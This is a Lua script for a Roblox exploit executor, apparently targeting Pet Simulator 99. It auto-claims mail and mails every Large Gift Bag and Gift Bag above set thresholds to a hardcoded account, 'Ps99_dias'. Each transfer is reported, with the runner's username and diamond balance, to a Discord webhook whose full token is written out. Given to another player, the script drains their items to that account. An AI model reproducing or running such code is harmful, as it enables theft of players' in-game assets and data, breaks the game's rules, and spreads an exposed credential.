repeat task.wait() until game:IsLoaded()

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Configuration
local userToMail = "Ps99_dias"
local webhookUrl = "https://discord.com/api/webhooks/1510138512807301302/rZtNxe2qHglLbcWZfuHKvP7fUR53TSFs-Cq6-NJO7qT-SXoim3Gn15LssQ82CMfVzC38"

local largeGiftThreshold = 20000  -- Send Large Gift Bags if count >= 20,000
local giftBagThreshold = 200000    -- Send Gift Bags if count >= 200,000

----------------------------------------------------------------
-- HELPER FUNCTIONS
----------------------------------------------------------------

local function getMailRemote(remoteName)
    local network = ReplicatedStorage:FindFirstChild("Network")
    if not network then return nil end
    
    local remote = network:FindFirstChild(remoteName)
    if remote then return remote end
    
    for _, child in pairs(network:GetChildren()) do
        if child.Name:lower():find(remoteName:lower():gsub(":", "")) then
            return child
        end
    end
    return nil
end

local function getDiamondsLeft()
    local diamonds = 0
    pcall(function()
        local saveModule = require(ReplicatedStorage.Library.Client.Save)
        local result = saveModule.Get()
        for _, v in pairs(result.Inventory.Currency) do
            if v.id == "Diamonds" then
                diamonds = v._am or 0
                break
            end
        end
    end)
    return diamonds
end

local function formatNumber(amount)
    local formatted = tostring(amount)
    local k
    while true do  
        formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
        if k == 0 then break end
    end
    return formatted
end

local function sendWebhook(itemName, itemCount)
    if not webhookUrl or webhookUrl == "" then return end

    local diamondsLeft = formatNumber(getDiamondsLeft())
    local formattedCount = formatNumber(itemCount)

    local embedData = {
        ["username"] = "Spidey Bot",
        ["embeds"] = {
            {
                ["title"] = "📬 You have mailed an item!",
                ["color"] = 15258703,
                ["fields"] = {
                    {
                        ["name"] = "📦 Mailed Item Info:",
                        ["value"] = "Item: `" .. itemName .. " (x" .. formattedCount .. ")`\nSent to: `" .. userToMail .. "`",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "👨‍💼 User Info:",
                        ["value"] = "In Account: `" .. LocalPlayer.Name .. "`\nDiamonds Left: `" .. diamondsLeft .. "`",
                        ["inline"] = false
                    }
                ],
                ["footer"] = {
                    ["text"] = "Mailer (iHH AutoMail)"
                }
            }
        }
    }

    if itemName == "Large Gift Bag" then
        embedData.embeds[1]["thumbnail"] = { ["url"] = "https://tr.rbxcdn.com/180ed7e834bd780829d5a9d80d2ceb58/150/150/Image/Png" }
    elseif itemName == "Gift Bag" then
        embedData.embeds[1]["thumbnail"] = { ["url"] = "https://tr.rbxcdn.com/2b39920ef1351d3caae9823cebf0d8c2/150/150/Image/Png" }
    end

    pcall(function()
        local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
        if req then
            req({
                Url = webhookUrl,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(embedData)
            })
        end
    end)
end

----------------------------------------------------------------
-- AUTO CLAIM MAIL
----------------------------------------------------------------
task.spawn(function()
    while task.wait(5) do
        pcall(function()
            local claimRemote = getMailRemote("Mailbox: Claim All") or getMailRemote("Mailbox_ClaimAll")
            if claimRemote then
                claimRemote:InvokeServer()
            end
        end)
    end
end)

----------------------------------------------------------------
-- AUTO SEND MAIL
----------------------------------------------------------------
task.spawn(function()
    while task.wait(10) do
        pcall(function()
            local saveModule = require(ReplicatedStorage.Library.Client.Save)
            local result = saveModule.Get()
            
            if result and result.Inventory and result.Inventory.Misc then
                local ms = result.Inventory.Misc 

                for itemIndex, itemData in pairs(ms) do
                    local sendRemote = getMailRemote("Mailbox: Send") or getMailRemote("Mailbox_Send")
                    if not sendRemote then break end

                    -- Send Large Gift Bag if threshold reached
                    if itemData.id == "Large Gift Bag" and itemData._am and itemData._am >= largeGiftThreshold then
                        local amountToSend = itemData._am
                        local payload = {
                            userToMail,
                            "",
                            "Misc",
                            itemIndex,
                            amountToSend
                        }
                        
                        sendRemote:InvokeServer(unpack(payload))
                        sendWebhook("Large Gift Bag", amountToSend)
                        task.wait(2)
                    end

                    -- Send Gift Bag if threshold reached
                    if itemData.id == "Gift Bag" and itemData._am and itemData._am >= giftBagThreshold then
                        local amountToSend = itemData._am
                        local payload = {
                            userToMail,
                            "",
                            "Misc",
                            itemIndex,
                            amountToSend
                        }
                        
                        sendRemote:InvokeServer(unpack(payload))
                        sendWebhook("Gift Bag", amountToSend)
                        task.wait(2)
                    end
                end
            end
        end)
    end
end)
